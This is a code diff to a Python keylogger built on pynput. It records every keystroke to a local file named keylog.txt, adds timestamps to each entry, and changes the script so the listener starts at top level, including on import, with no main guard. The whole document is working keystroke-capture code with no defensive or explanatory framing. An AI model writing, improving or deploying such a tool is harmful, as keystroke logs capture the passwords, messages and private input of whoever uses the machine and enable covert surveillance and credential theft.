@@ -1,19 +1,16 @@
 from pynput.keyboard import Listener
+from datetime import datetime
 
 log_file = "keylog.txt"
 
 def on_press(key):
+    time_stamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
     try:
         with open(log_file, "a") as f:
-            f.write(f"{key.char}")
+            f.write(f"[{time_stamp}] {key.char}\n")
     except AttributeError:
         with open(log_file, "a") as f:
-            f.write(f"[{key}]")
+            f.write(f"[{time_stamp}] [{key}]\n")
 
-def start_keylogger():
-    """Starts the keylogger."""
-    with Listener(on_press=on_press) as listener:
-        listener.join()
-
-if __name__ == "__main__":
-    start_keylogger()
+with Listener(on_press=on_press) as listener:
+    listener.join()
